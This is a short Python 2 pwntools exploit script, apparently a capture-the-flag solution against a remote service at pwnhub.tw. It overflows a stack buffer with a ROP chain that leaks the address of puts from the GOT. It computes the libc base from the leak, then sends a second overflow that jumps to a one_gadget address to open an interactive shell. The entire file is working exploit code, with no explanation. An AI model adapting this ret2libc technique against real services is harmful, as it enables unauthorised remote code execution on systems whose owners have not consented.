#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('./libc.so.6')
r = remote('pwnhub.tw', 56026)
#r = remote('127.0.0.1', 7122)

pop_rdi_ret = 0x4006f3
puts_got = 0x601018
puts_plt = 0x4004e0
call_puts_lev_ret = 0x400681
main_addr = 0x400636

rop = [
	pop_rdi_ret,
	puts_got,
	puts_plt,
	main_addr,
]

#embed()

r.sendline('A'*40+flat(rop))
#r.sendline(cyclic(32)+p64(0x601040)+flat(rop))
r.recvuntil('!\n')
x = r.recvline()
libc_puts = u64(x[:-1].ljust(8, '\x00'))
print 'puts: ', hex(libc_puts)

puts_offset = e.symbols['puts']
libc_base = libc_puts - puts_offset
one_gadget = 0xf0567

r.sendline('B'*40+p64(libc_base+one_gadget))
r.interactive()

